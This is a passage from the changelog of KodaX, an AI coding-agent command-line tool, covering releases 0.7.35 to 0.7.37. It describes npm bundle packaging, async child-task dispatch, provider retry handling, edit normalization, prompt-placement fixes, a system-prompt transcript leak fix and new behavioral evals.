- **FEATURE_147 — npm Publishing Pipeline (Phase 4.1 + 4.2 + 4.3)** (commits `a840f22`, `633c01a`) — Three of four phases shipped. **Phase 4.1 + 4.2** (`refactor(packages,v0.7.37)`): scope rename `@kodax/*` → `@kodax-ai/*` across 530+38+11 = 579 TypeScript imports + 26 `package.json` deps + 6 tsconfig paths; `@kodax/ai` → `@kodax-ai/llm` to remove the awkward `@kodax-ai/ai` repetition (directory `packages/ai/` retained — only the package `name` field changed, avoiding a git-history-breaking cross-directory rename). `scripts/patch-publish-fields.mjs` adds `files: ["dist", "README.md", "LICENSE"]` + `publishConfig: { access: "public" }` to all 9 sub-packages and rewrites internal deps from `*` to `*` (no-op normalization — the workspace-protocol approach was rejected when npm 11 surfaced `EUNSUPPORTEDPROTOCOL`; deps stay `*` locally and substitute to `^<version>` at publish time). **Phase 4.3** (`feat(scripts,v0.7.37)`): `scripts/release-npm.mjs` orchestrated the multi-package publish (since deleted — see FEATURE_150). `scripts/exclude-tests-from-build.mjs` adds `**/*.test.ts(x)` + `**/__tests__/**` to all 9 sub-package tsconfig excludes — keeps source builds lean. **Phase 4.4 (actual multi-package `npm publish`)** was **abandoned** after the first sweep revealed three P0 runtime-deps bugs (see Hotfix Note above). The npm distribution architecture pivots to single-bundle in **FEATURE_150**.

- **FEATURE_150 — Single-bundle npm distribution** (this release window) — Pivots npm distribution from "10 separate packages" to "1 bundled `@kodax-ai/cli`". Source-layer monorepo unchanged (ADR-001 / ADR-021 still hold; 9 sub-packages remain independently usable via `git clone + npm link / file:`). Publish-layer simplified: `scripts/build-bundle.mjs` runs esbuild against three entries — `src/kodax_cli.ts` → `dist/kodax_cli.js` (CLI bin entry), `src/index.ts` → `dist/index.js` (SDK entry consumed by builtin helper scripts and path-B SDK consumers via `package.json#exports`), and verbatim copy of `packages/skills/dist/builtin/` → `dist/builtin/`. All 9 internal `@kodax-ai/*` source modules are inlined into the bundle via esbuild's transitive import tracking. All third-party packages (45 total: 17 root + 26 vendored Ink fork transitives + `typescript` `tsx` `zod`) stay external and are listed in root `package.json#dependencies`. Helper scripts in `packages/skills/src/builtin/skill-creator/scripts/` (6 files) gain a `loadKodaXSDK()` helper in `utils.js` that resolves the SDK via `import.meta.url`-relative path with bare-name fallbacks for dev / monorepo modes. `scripts/release-npm.mjs` and `scripts/publish-root-cli.mjs` deleted; replaced by `scripts/release.mjs` (build → rewrite root pkg name to `@kodax-ai/cli` + drop `private` + normalize bin paths → npm publish to registry.npmjs.org → restore pristine bytes via try/finally). Tarball size: 1.0 MB gzipped / 3.3 MB unpacked / 44 files (47% smaller than v0.7.37 multi-package total of ~1.9 MB across 10 tarballs). Architecture decision recorded in **ADR-022**; bundle layout, three integration paths (CLI users / source SDK consumers / npm SDK consumers), and 5 known risks (`tsx` external; vendored Ink fork transitives; helper-script path hardcoding; opt-in source maps; bundle size DCE) with applied mitigations recorded in **HLD §12**. Risk 3 mitigation: `react-devtools-core` is intercepted by an esbuild plugin and stubbed to no-op exports — ink's vendored fork dynamic-imports devtools only when `process.env.DEV='true'` but esbuild hoists the import to module top, where react-devtools-core's CJS `backend.js` evaluates `self.X = ...` and fails under Node.js. The stub eliminates this load-time path entirely (production CLI never enters dev branch).

- **FEATURE_148 — Pattern B anti-immediate-await rule** (commit `df72ae8`) — Worker role-prompt now carries an explicit ANTI-PATTERN rule forbidding `await_child_task` immediately after `dispatch_child_task` when there is other useful work to do (additional dispatches, side-reads the user requested, synthesis planning, prefetched context). Awaiting immediately collapses Pattern B (FEATURE_119 v0.7.36) back to a synchronous call with extra steps. The rule embeds a concrete example: *"if the user asks 'do X (slow) AND also do Y (cheap)' — dispatch X, then DO Y, then await X."* Backed by a unit test asserting the rule string ships in the rendered prompt + a behavioral eval dataset (`benchmark/datasets/pattern-b-post-dispatch-probe`) + eval driver (`tests/feature-148-post-dispatch-probe.eval.ts`) + human test guide (`docs/test-guides/FEATURE_148_BEHAVIORAL_EVAL_v0.7.37_TEST_GUIDE.md`). Closes the qualitative miss FEATURE_146-B's single-turn structural eval couldn't see.

### Fixed

- **`kodax -c` transcript leak — system messages no longer rendered as bubbles on session resume** (commit `7aabbc1`) — `extractHistorySeedsFromMessage` in `packages/repl/src/ui/utils/message-utils.ts` previously passed `role: 'system'` messages through to the restored history as `type: "system"` bubbles. System messages in KodaX are LLM-internal scaffolding (Scout/Generator/Planner/Evaluator role-prompts, capability-sections, AMA controller metadata, repo-intelligence snapshots) — never user-facing. On `kodax -c` the prior task's full Scout role-prompt (including its cwd, repo snapshot, MCP list, and `Original user request:`) was being re-rendered into the new transcript as a "System [HH:MM]" bubble, leaking task-internal context to the user. Fix: `case "system"` now returns `[]` unconditionally; live-session user-visible banners go through `addHistoryItem` directly, not this restore path, so filtering at restore is safe. 3 new tests pin the behavior; full `@kodax-ai/repl` suite (1088 tests) regression-clean. Pre-existing bug since FEATURE_061 v0.7.16 introduced Scout-first AMA — not a v0.7.37 regression, but caught and fixed in the v0.7.37 release window.

- **Test harness flake under heavy parallel load** (commit `d4a47bc`) — Vitest's 5s default per-test timeout was being exceeded by git/subprocess/IO/`runKodaX` operations when ~4800 tests run concurrently. Logic was sound — single-test runs always passed; the flake was purely wall-clock contention. Following the v0.7.34 Issue 128 precedent (10 contract suites bumped to 15s), this commit raises per-test timeouts on 4 specific suites: `benchmark/harness/worktree-runner.test.ts` (`GIT_TEST_TIMEOUT = 20_000` for 6 git-shelling tests), `benchmark/harness/h2-boundary-runner.test.ts` (30s → 60s on 4 cells), `packages/coding/src/agent.provider-policy.test.ts` (90s → 180s on 2 `runKodaX` integration tests — critical because vitest's per-test timeout aborts the it-block but does NOT cancel the in-flight `provider.stream`, so a timeout cascades a leaked tool-call into the next test's `calls.length` assertion bucket), and `tests/sa-refactor-goldens/selection.test.ts` (30s on 2 corpus-scanning tests over `~/.kodax/sessions/*.jsonl`). Global `testTimeout` untouched so unit-test perf regressions still surface fast. Verified: 4848/4848 tests green in 107s on the full sweep.

### Tested

- **5 new eval files** under `tests/`:
  - `feature-116-active-cache-control.eval.ts` — 8 structural ship-gate tests (FEATURE_116)
  - `feature-146-a-prompt-overlay-behavioral.eval.ts` — 5×6×2=60 cell LLM-judge eval (FEATURE_143 follow-up)
  - `feature-146-b-pattern-b-behavioral.eval.ts` — 5×5=25 cell LLM-judge eval (FEATURE_119 follow-up)
  - `feature-146-c-unicode-edit-fallback-behavioral.eval.ts` — 5×10=50 cell LLM-judge eval (FEATURE_131-B follow-up)
  - `feature-148-post-dispatch-probe.eval.ts` — multi-turn anti-immediate-await behavioral eval (FEATURE_148)
- **4 new dataset directories** under `benchmark/datasets/` — `prompt-overlay-position/`, `pattern-b-parallel-decision/`, `unicode-edit-fallback/`, `pattern-b-post-dispatch-probe/` (all version-tracked with cases.ts + README.md per FEATURE_104 v2 convention)
- **`packages/ai/src/providers/openai-usage-cache-fields.test.ts`** — 7 focused tests pinning the DeepSeek private-cache-field fallback chain (FEATURE_116-D).
- **First behavioral sweep total** for FEATURE_146: ~135 LLM cells (60+25+50) cost ≈ $2.70 wall-clock total ~10 minutes serial. All three sweeps PASS pre-registered gates.
- **Per-test timeout bumps** on 4 flaky suites (worktree-runner / h2-boundary-runner / agent.provider-policy / sa-refactor-goldens — see Fixed section above) eliminate false-positive flakes under the full ~4800-test parallel run. 4848/4848 green in 107s on the full sweep.
- Build green; type-check clean; full test suite regression-clean against v0.7.36 baseline.

### Migration notes

- **No breaking changes** for runtime users on the SA path or AMA path. FEATURE_116 cache_control markers are ignored by providers that don't honor them; FEATURE_141 is REPL-render-only and adds no new wire fields; FEATURE_146 is eval infrastructure with no runtime surface.
- **SDK consumers via `git clone + npm link`** must rename imports from `@kodax/*` to `@kodax-ai/*` (and `@kodax/ai` → `@kodax-ai/llm`) — the migration sed helper is documented in `docs/features/v0.7.37.md` § FEATURE_147 Migration impact. CLI users (the dominant audience) see zero impact: `git clone + kodax help` continues to work, and after FEATURE_150 reships, `npm install -g @kodax-ai/cli` is the new install-by-name path (single bundle).
- **SDK consumers expecting `@kodax-ai/coding` / `@kodax-ai/agent` / etc. as separate npm packages**: those 9 packages are no longer published to npm under FEATURE_150. The two supported integration paths are now: (path A) `git clone + npm link/file: + bundle your own product with esbuild` (recommended for SDK integrators — KodaX's own monorepo workflow is the same shape); (path B) `npm install @kodax-ai/cli + import { runKodaX, ... } from '@kodax-ai/cli'` (the bundled root re-exports SDK API via `package.json#exports`; binds your SDK upgrades to CLI version cadence — acceptable for small integrations). See HLD §12.2 for the integration-path table.
- **Behavioral eval gates as continuous quality regression**: the 3 new eval files run on demand (skip when API keys absent) and become the load-bearing v0.7.37+ regression guard for the v0.7.36 LLM-facing changes. Re-run triggers documented per dataset README.

### Quality gate posture (honest)

v0.7.36 shipped with structural eval + dataset regression (no API keys) for the three LLM-facing changes (FEATURE_119 / FEATURE_131-B / FEATURE_143) and explicitly tracked the LLM-judge multi-alias behavioral eval as `FEATURE_146` for v0.7.37. **v0.7.37 closes that gap**: 135 cells across 3 sweeps × 5 production aliases (zhipu/glm51, kimi, mmx/m27, ds/v4pro, ds/v4flash); all three sweeps PASS pre-registered ship gates with margin (FEATURE_146-A B-section actually outperformed legacy on the hardest task; FEATURE_146-B trigger rate 76-88% vs 60% gate; FEATURE_146-C false-positive=0 + parity match rate). The behavioral validation that was implicitly deferred at v0.7.36 ship is **explicitly load-bearing for v0.7.37**.

---

## [0.7.36] - 2026-05-07

### Theme

**Six-feature delivery — async dispatch (Pattern B), provider Retry-After + exponential backoff, file-mutation queue + Unicode normalization, Skill UX + prompt-overlay 错位修正, AMA Harness V2 foundation, Message Queue.** Every feature originally scoped for v0.7.36 ships in this release — nothing is deferred. Two of the six (FEATURE_114 V2 single-loop runner, FEATURE_115 mid-turn drain UX-polish) ship as foundation surfaces gated behind `KODAX_HARNESS_V2` (default-off) and the existing `KODAX_ASYNC_DISPATCH=0` escape hatch, so the on-by-default behavior is byte-equivalent to v0.7.35.1 for the SA path and additive for AMA. Net: 14 commits across 9 packages (12 feature commits + 2 release-ops); 3683 unit tests + 26 eval/regression tests passing; build green on Windows + POSIX.

### Added

- **FEATURE_115 — Message Queue foundation + mid-turn drain** (commits `5294e6b`, `ebb46de`, `a4bccca`, `d33b5d1`, `a76097e`) — Two-tier MessageQueue (`user` priority + `background` priority) with agent-id routing in `@kodax/agent`, fed by REPL `pendingInputs` (1B mirror), drained mid-turn at runner-driven yield points (1C), with a documented FEATURE_111-absorbed soft-pause UX (1D) and a child task-notification helper that lets dispatched children surface settle events back into the parent's MessageQueue without blocking the parent's tool loop (1E). Pre-existing `@kodax/agent ↔ @kodax/session-lineage` build cycle fixed in 1A as part of the foundation work. Mid-turn drain is currently gated to runner-driven AMA only — SA path unchanged. The queue is the substrate FEATURE_119's async dispatch (Phase 2A) and FEATURE_130's retry-after notifications (Phase 2B) ride on top of.
- **FEATURE_119 — Pattern B async dispatch** (commit `ebdf58f`) — `dispatch_child_task` and `await_child_task` are now separate tools. Sync path retained as `KODAX_ASYNC_DISPATCH=0` escape hatch; default async path launches the executor without awaiting, registers the in-flight handle in `ctx.childTaskRegistry` (substrate-level, shared between SA + AMA paths), fires `enqueueChildTaskNotification` on settle, and returns a `task_id:<id>` banner so the parent can decide when to await. `await_child_task` is the regular awaiter, registers worktree finalization, deletes the registry entry on completion, and surfaces live status via `ctx.reportToolProgress`. Wired into Scout/Generator role tool sets only (Planner/Evaluator do not dispatch children). Excluded from child-executor's tool set (children cannot recursively dispatch). 10 behavioral tests in `tools/async-dispatch.test.ts`.
- **FEATURE_130 — Provider Retry-After + Exponential Backoff** (commit `9139852`) — All 12 provider adapters (Anthropic, OpenAI, DeepSeek, Kimi, Qwen, Zhipu, MiniMax, MiMo, Gemini CLI, Codex CLI, …) now honor 429/503/529 `Retry-After` headers across 4 forms: integer-seconds, HTTP-date, `retry-after-ms`, and exponential-backoff fallback when no header is present. Helper `parseRetryAfter` + `extractHeadersFromError` lives in `@kodax/ai/retry/retry-after.ts` and is consumed centrally in `withRateLimit` so every `KodaXBaseProvider` subclass inherits the behavior without per-adapter wiring. `withRateLimit` accepts an optional `onRetryAfter` callback that fires before the retry sleep with `{ provider, attempt, maxAttempts, waitMs, source: 'header' | 'backoff' }`. `KodaXProviderStreamOptions.onRetryAfter`, `KodaXEvents.onRetryAfter`, and a new `recordRetry`/`RetryRecord` cost-tracker channel propagate the event through `run-substrate.ts`, `stream-handler-wiring.ts`, and into the Ink REPL surface as `[Rate limited] (provider) — retrying in Xs [source] (attempt/max)`. Cost report now appends a "Retries: N (Ys total wait)" line. `isRateLimitError` keyword set extended with `overload`/`overwhelmed`/`503`/`529`/`busy`. 22 unit tests in `retry-after.test.ts` cover all 4 forms, Headers API extraction, clamping, jitter, and concurrent-safety.
- **FEATURE_131 — File Mutation Queue + Edit Unicode Normalization** (commit `190356a`) — `withFileMutation` (path-keyed serialization) at `tools/_internal/file-mutation-queue.ts` wraps `edit` / `multi-edit` / `write` / `insert-after-anchor` so concurrent mutations to the same file serialize through a single in-process queue while different files proceed in parallel. `normalizePathForKey` is platform-aware: Windows lowercases the entire path (NTFS is case-insensitive); POSIX preserves component case but normalizes separators. `KODAX_PATH_KEY_PLATFORM` env override exposed for hermetic tests. Edit / multi-edit / insert-after-anchor add a Unicode-normalized fallback before the legacy `NOT_FOUND` error: `normalizeForFuzzyMatch` runs NFKC, maps smart quotes (`""''`) to ASCII, em-dash (`—`) to `--`, en-dash (`–`) to `-`, non-breaking space + ideographic space to regular space — closing the most common LLM-needle vs file-haystack drift. Cross-process content-hash safety (FEATURE_125) explicitly stays in v0.7.41. 16 + 14 unit tests across `file-mutation-queue.test.ts` and `edit-unicode-normalize.test.ts`.
- **FEATURE_143 — Skill UX hardening + prompt-overlay position migration** (commits `29e5639`, `68be923`) — Two coupled deliverables. (1) **Skill UX**: `getSystemPromptSnippet()` in `@kodax/skills` now leads with a "BLOCKING REQUIREMENT: invoke the relevant Skill tool BEFORE generating any other response" directive so the LLM treats `/skill:<name>` as a load-bearing gate, not a hint. The classic readline REPL gains the same skills-prompt that the Ink REPL has had since v0.7.30. New `parseInlineSkillReferences` helper in `repl/interactive/commands.ts` recognizes inline `/skill:<name>` references mid-message (regex `/(^|\s)\/skill:([\w][\w.\-:]*)/g`, skips leading slash references which still go through `parseCommand`). (2) **prompt-overlay 错位修正**: the v0.7.26 FEATURE_084 stitched the AMA `plan.promptOverlay` (routing notes block: task-family guidance, work intent, brainstorm directives, provider-policy notes, explicit-reason trail) onto the user-prompt head in `runner-driven.ts`. The Worker received the bytes but read them as user input rather than platform truth — semantic drift vs the SA path's `capability-sections.ts` system-prompt injection. v0.7.36 routes the same string through `ManagedRolePromptContext.promptOverlay` so it lands as a system-prompt section, matching SA-path behavior across all 4 AMA roles (Scout / Planner / Generator / Evaluator). `runner-driven.ts:promptWithOverlay` now returns the bare `prompt` argument unmodified — bytes-only-once invariant pinned by a structural eval. 7 commands-parse tests + 3 structural eval tests in `tests/prompt-overlay-position-migration.eval.ts`.
- **FEATURE_114 — AMA Harness V2 foundation** (commit `75a3853`) — Foundation surfaces shipped behind `KODAX_HARNESS_V2` env flag (default-off, case-insensitive `'true'` only). New `PLANNED` harness profile across `@kodax/ai` (`KodaXHarnessProfile`), `@kodax/coding` (reasoning, budget, max-rounds tables — `200` budget cap, `8` max rounds), and the runner-driven harness tier order. New `runDeterministicEvaluator` helper at `task-engine/deterministic-evaluator.ts` spawns `build` / `test` / `lint` commands with default 90s timeout and returns `pass | fail | skipped | error` with stderr/stdout tails. Recognizes "Missing script" / "command not found" as `skipped` (not error). New `RunnerNudgeState` + `observeToolCall` + `maybeAppendPlanNudge` at `task-engine/runner-nudges.ts` — once-only emission after 5 read-tool calls (read/grep/glob/code_search/semantic_lookup) without a plan, threshold configurable. New `planBeforeMutate` warn-severity invariant at `agent-runtime/invariants/plan-before-mutate.ts` — gates on `recorder.todoUpdateCount === 0 && !recorder.workerTrivialDeclaration`, no-ops when fields absent so V1 path is unaffected. Coding-side invariant chain now ships 9 ids (was 8): the V2 `planBeforeMutate` coexists with V1's `harnessSelectionTiming` during the migration window. New `worker-role-prompt.ts` builder with PLAN-FIRST CONTRACT + SCOPE COMMITMENT + MUTATION DISCIPLINE + DISPATCH RULE A/B/C + Pattern B + EVALUATOR HANDOFF sections. Full V2 single-loop runner-driven path (Worker = Scout+Planner+Generator merge, Evaluator preserved as structural gate) lands in v0.7.37. 9 + 7 + 12 unit tests across `runner-nudges.test.ts` / `deterministic-evaluator.test.ts` / `worker-role-prompt.test.ts`. Existing 8-invariant assertions in `index.test.ts` and `feature-101-106-joint.test.ts` updated to expect 9.
- **`tests/prompt-overlay-position-migration.eval.ts` structural ship gate** (commit `68be923`) — 3 hermetic tests (no API keys) covering migration completeness across all 4 AMA roles, no-regression when overlay absent, and whitespace-only overlay treated as absent.
- **`tests/feature-119-pattern-b-async-dispatch.eval.ts` structural ship gate** — 9 hermetic tests covering the launch+await tool surface (both `dispatch_child_task` AND `await_child_task` registered), description load-bearing content (LLM gets WHEN-TO-USE / parallel-dispatch / `task_id:<id>` banner / background-notification anchors), Worker V2 prompt Pattern B integration, and default-on policy with `KODAX_ASYNC_DISPATCH=0` escape hatch.
- **`tests/feature-131-unicode-dataset-regression.eval.ts` dataset regression** — 12 representative needle/haystack pairs reconstructed from real-world LLM silent-edit-fail cases (smart quotes, em-dash where file has `--`, en-dash where file has `-`, nbsp, ideographic space, full-width Latin via NFKC, combined-artifact "real-world cocktail"), each asserting the legacy byte-exact fallback MISSES + the Unicode-normalized fallback finds a UNIQUE match. 2 true-negative cases guard against over-broad normalization (e.g. NFKC must not lowercase identifiers).

### Tested

- **Cumulative test surface this release**: 3683 tests passing (coding 2097, repl 1056, ai 219, skills 18, agent contributions); plus 3 + 9 + 14 = 26 new eval/regression tests under `tests/*.eval.ts`. Build green; type-check clean; full regression run on Windows.

### Quality gate posture (honest)

The v0.7.36 design doc originally specified a **multi-alias × multi-task LLM-judge behavioral eval** for FEATURE_143 (96 cells across 8 alias × 6 task × 2 prompt variant) as the load-bearing ship gate, implicitly applicable to FEATURE_119 (parallel-dispatch decision quality, ~20 cells) and FEATURE_131-B (real LLM rollout silent-edit-fail rate, ~60 cells) too — the LLM-rollout-level gold standard. What this release ships instead:

- **Three LLM-facing changes** (FEATURE_119 / FEATURE_131-B / FEATURE_143) ship with **structural eval + dataset regression** as the on-CI ship gate (no API keys, no LLM judge, runs deterministically).
- **The 176-cell multi-alias LLM-judge sweep** (~$30 budget across 8 provider aliases) is **formally tracked** as `FEATURE_146` in [docs/features/v0.7.37.md § v0.7.36 Behavioral Eval Follow-ups](docs/features/v0.7.37.md#v0736-behavioral-eval-follow-ups正式-track非隐式-defer) — a real planned line item with scope, gates, datasets, and rollback policy. `docs/FEATURE_LIST.md` registers FEATURE_146 against the v0.7.37 slot. **This is not an implicit "we'll get to it eventually" — it is a load-bearing v0.7.37 quality gate.**
- **Risk being explicitly accepted**: production rollouts of v0.7.36 may surface a behavioral regression that the structural gate cannot see (e.g. a model decides to await immediately after dispatch, defeating Pattern B; or post-migration prompt-overlay shifts H0/H1/H2 routing distributions). **Mitigation**: FEATURE_146 ships in v0.7.37 (next release); any sub-eval failure triggers an independent patch release (e.g. `0.7.37.1`) without blocking the v0.7.37 main line (FEATURE_116 / FEATURE_141).

### Migration notes

- **No breaking changes** for SA-path users — `KODAX_HARNESS_V2` defaults off, `KODAX_ASYNC_DISPATCH` defaults on (Pattern B is the new default but the runtime degrades gracefully via the registered `await_child_task` tool); existing scripts work unchanged.
- **AMA-path users** see a behavior fix: `plan.promptOverlay` bytes are now read by Workers as system-prompt context rather than user input. This is a *correctness* migration, not a semantic break — Workers behave more correctly post-FEATURE_143.
- **SDK consumers calling `@kodax/ai` providers directly**: the new `KodaXProviderStreamOptions.onRetryAfter` callback is optional. Existing call sites that don't set it are unaffected; the cost tracker still records `RetryRecord`s through the substrate for any consumer using `@kodax/coding`'s run loop.
- **SDK consumers calling `@kodax/coding` tools directly**: `edit` / `multi-edit` / `write` / `insert-after-anchor` are now serialized per file path within the same process. Cross-process serialization (FEATURE_125) ships in v0.7.41.

---

## [0.7.35.1] - 2026-05-07

> **Milestone tag, not a published release** — `package.json` versions remain at `0.7.35` (4-segment `0.7.35.1` is invalid semver and would be rejected by `npm publish`). The `0.7.35.1` git tag marks this checkpoint; the work below ships under npm version **`0.7.36`** alongside `FEATURE_143`.

### Theme

**Structural cleanup patch + AMA worker capability parity fix** — fixes FEATURE_082 (v0.7.24) package-boundary drift, tames 13 hardcoded `~/.kodax/` callsites, AND closes the v0.7.26 FEATURE_084 capability-context bypass that left AMA workers blind to MCP servers / skills / project AGENTS.md / git status / project tree. All changes are byte-equivalent on the existing SA coding path; the **non-coding** consumers of `@kodax/session-lineage` see a behavior delta (a neutral default compaction prompt — empirically validated by a 150-cell prompt eval), and the **AMA path** sees a behavior fix (workers now receive the same 6 capability sections SA workers always saw).

### Refactored

- **FEATURE_142 B-R1 — two-layer split for compaction summary prompt** (commits `106c63c` + `a00ed30` hotfix) — `@kodax/session-lineage`'s built-in `SUMMARY_PROMPT` / `UPDATE_SUMMARY_PROMPT` were coding-flavored ("another coding agent", "EXACT file paths, function names", "## Files & Changes" schema, 401-on-/api/auth/login example), violating ADR-021's rule that the generic compaction primitive package must not enumerate coding-specific terminology. Split into two layers: (1) `@kodax/session-lineage` ships neutral `DEFAULT_SUMMARY_PROMPT` / `DEFAULT_UPDATE_SUMMARY_PROMPT` (the candidate-a-conservative winner from a 150-cell prompt eval — 3 candidates × 10 fixtures × 5 aliases at `tests/compaction-prompt.eval.ts`); (2) `@kodax/coding` ships verbatim v0.7.35 `CODING_SUMMARY_PROMPT` / `CODING_UPDATE_SUMMARY_PROMPT`, SHA-locked at `470cb93…` / `86fadb9…` against the v0.7.35 release tree. Three coding callers (`compaction-orchestration.ts` CAP-060, `repl/.../commands.ts` manual `/compact`, and `task-engine/_internal/managed-task/compaction.ts` Runner-driven AMA — the third was missed in the original commit and caught by code review, hence the hotfix) explicitly pass `CODING_*_PROMPT` to preserve byte-equivalent v0.7.35 behavior on every coding path. Caller routing pinned by both a runtime mock (`tryIntelligentCompact` args[7] / args[8]) and a source-level audit (regex match for `CODING_SUMMARY_PROMPT,\s*CODING_UPDATE_SUMMARY_PROMPT` adjacency). Eval finding worth recording: the coding-flavored baseline empirically *outperforms* both neutral candidates on **non-coding** recall too (97.0% vs 93.2% / 92.3%) — coding-flavored wording generalizes well; the split is for architectural correctness, not measured behavior. Generic / non-coding consumers of `@kodax/session-lineage` accept a 2-3pt non-coding-recall regression as the cost of clean layer boundaries.

- **FEATURE_142 Batch D — uplift 4 substrate middleware to `@kodax/agent/runtime-middleware/`** (commit `12a2b55`) — Per the audit-narrowed Batch D scope, only modules with pure `@kodax/ai` + `@kodax/session-lineage` deps are uplifted: `compaction-trigger.ts` (`shouldCompact`), `compaction-fallback.ts` (`gracefulCompactDegradation`), `context-window.ts` (`resolveContextWindow` / `DEFAULT_CONTEXT_WINDOW`), `history-cleanup.ts` (`cleanupIncompleteToolCalls` / `validateAndFixToolHistory`). `boundary-tracker-session.ts` was originally listed in the doc but turned out to depend on `@kodax/coding/src/resilience/` (audit miss caught at implementation time) — uplifting it would create an `@kodax/agent → @kodax/coding` cycle, so it stays in coding. Coding-side re-exports preserve every existing import path; SDK consumers via `@kodax/coding`'s barrel see no API break. Two contract-test mock targets (`vi.mock('../compaction-fallback.js', ...)` etc.) shifted to `vi.mock('@kodax/agent', ...)` with `importOriginal` spread so other agent exports stay live.

- **FEATURE_142 Batch E — extract capability-sections helper for SA-path dedup** (commit `4018077`) — The 13 capability-context prompt sections previously inlined in `buildSystemPromptSnapshot` (`builder.ts:32-181`) are now hoisted into `buildCapabilityContextSections` at `packages/coding/src/prompts/capability-sections.ts`. SA path (the `runKodaX` direct-call flow) keeps responsibility for cwd resolution + final snapshot assembly; section construction is now a single-function call. SA output is byte-equivalent — `builder.test.ts`'s 11 existing tests are the integration-level guard, plus 6 new unit tests pin canonical id ordering + conditional inclusion in the helper. AMA worker (`role-prompt.ts`) is intentionally NOT wired in this batch; that's `FEATURE_144`, shipped in commit `79c3dbd` under the same milestone (see Fixed section below). The helper lives in `coding/prompts/` rather than `@kodax/agent/` because consumption is coding-internal (a future `@kodax/data-analysis-agent` would have its own builder + role-prompt with its own section set — `prompt-overlay` is coding-routing-specific) and hoisting would force `@kodax/agent → @kodax/skills` / `@kodax/mcp` cross-package deps, breaking the "agent doesn't depend on application packages" promise.

### Added

- **FEATURE_145 — agent-home 3-tier resolution helper** (commit `ed7c17d`) — Centralizes 13 hardcoded `path.join(homedir(), '.kodax', ...)` callsites across `@kodax/coding` (3), `@kodax/mcp` (2), `@kodax/repl` (7), `@kodax/session-lineage` (1) into a single `getAgentConfigPath(...)` resolver at `@kodax/agent/runtime/agent-home.ts`. Three-tier priority: (1) programmatic override via `setAgentConfigHome(path)` for substrate-consumer agents (`@kodax/ops-agent` etc.) to redirect at boot; (2) `KODAX_HOME` env var; (3) `~/.kodax/` default. With override unset and env unset, the resolver returns the same byte sequence as the prior hardcoded calls — byte-equivalent for the existing user base. Process-level singleton (not per-call DI) chosen because the callsites are buried in library helpers and threading `configHome` through 30+ helper signatures would invite silent fallbacks on miss. Two callsites intentionally NOT migrated: `@kodax/ai/src/reasoning-overrides.ts` (would create `@kodax/ai → @kodax/agent` dependency cycle; existing inline `process.env.KODAX_HOME ??` already honors the env tier), and `@kodax/skills/src/types.ts:255` (zero-dep-package policy). Project-relative `.kodax/` paths and CWD-relative `path.join('.kodax', 'constructed', ...)` constants are untouched — those name a different concept (per-project config) and use a different root.

### Fixed

- **FEATURE_144 — AMA worker capability context parity** (commit `79c3dbd`) — Closes the v0.7.26 FEATURE_084 latent bug where the AMA Runner-driven migration silently dropped 6 of the 13 SA-path capability-context sections from worker prompts: `mcp-capability-context` (active MCP server visibility), `skills-addendum` (skill-specific guidance), `project-agents` (AGENTS.md / CLAUDE.md project rules), `tool-construction` (tool self-construction guidance), `git-context` (branch / status snapshot), `project-snapshot` (lightweight repo tree). Three of these dropouts produced confirmed user-facing bugs (MCP servers invisible to Scout, skills invisible to workers, project CLAUDE.md rules ignored by Generator). `runner-driven.ts` now builds the SA path's capability sections ONCE per AMA entry via `buildCapabilityContextSections()`, filters out the 7 sections AMA-owned by other Runner channels (`workspaceSection` / `prebuiltRepoIntelligenceContext` / Shard 6d-L overlay stitching) so they don't duplicate, joins the remaining 6 into a string, and threads it through `ManagedRolePromptContext.capabilityContextBlock`. `role-prompt.ts` inserts the block right after `workspaceSection` in every role's section array (Scout / Planner / Generator / Evaluator), matching the SA-path adjacency between runtime truth and capability truth. Implementation simpler than the original design (no new public `KodaXContextOptions` fields, no `builder.ts` changes): SA path renders once per session so the per-worker FS-load concern is AMA-specific — a closure-local `prebuiltCapabilityContextBlock` in `runner-driven.ts` caches the result across all workers spawned from the same AMA entry, FS load upper bound stays at 1 per AMA entry regardless of worker count. Best-effort error handling — capability-build failures emit `[fea144:capability-context-build-failed]` resilience-debug events and let the worker fall back to legacy `workspaceSection`-only visibility (matching pre-FEATURE_144 behavior). Structural ship gate: 4 unit tests in `role-prompt.test.ts` (every role renders the block / positioned between workspace and decision summary / legacy callers unaffected / whitespace-only treated as absent) + 3 deterministic ship-gate cases in `tests/ama-worker-capability-parity.eval.ts` (filter retains 6 + drops 7 / all 4 roles render end-to-end with markers / legacy parity). The 4-dimension behavioral eval (instruction-following parity / `mcp_search` call rate / CLAUDE.md compliance / dirty-repo git declaration) requires a multi-provider judge harness build that exceeds patch scope and is tracked as a v0.7.36 follow-up.

- **Post-Batch-E review fixes** (commit `928ce59`) — Addresses 4 findings from the FEATURE_145 + Batch E code review: (HIGH-1) document load-time freeze of `KODAX_DIR` / `KODAX_SESSIONS_DIR` / `KODAX_CONFIG_FILE` in `repl/common/utils.ts` and `USER_CONFIG_FILE` in `repl/common/permission-config.ts` — these are public exports evaluated at module import; substrate consumers calling `setAgentConfigHome()` AFTER importing repl will see stale paths, so JSDoc warnings + an inline `storage.ts` reminder document the required ordering; (MEDIUM-1) `McpCapabilityProvider` captures `defaultMcpCacheDir()` once at construction and threads it into every spawned runtime — JSDoc warning documents the construction-time-capture semantics + escape hatch (explicit `options.cacheDir`); (LOW-2) `buildCapabilityContextSections()` previously required callers to pass `executionCwd`, creating a footgun where SA / future AMA paths could resolve cwd differently and drift — the parameter is now optional with internal `resolveExecutionCwd(options.context)` fallback; (BATCH-E-1) added byte-equivalence snapshot test asserting full rendered output structure stays stable post-extraction (normalizes cwd / basename / Node version / platform for cross-platform determinism, guards section ordering and content concatenation, not just metadata).

---

## [0.7.35] - 2026-05-04

### Theme

**Hotfix-only release for 3 P0 issues found post-v0.7.34.** No new features. FEATURE_097 (AMA Runner Realtime Todo List) was effectively non-functional in production despite all-green tests because two latent bugs in the parser + prompt prevented the runtime seeding gate from ever firing; FEATURE_092 (Auto Mode Classifier) silently kept using stale provider/model after `/model` swaps. All three are correctness fixes — no protocol or API breakage.

### Fixed

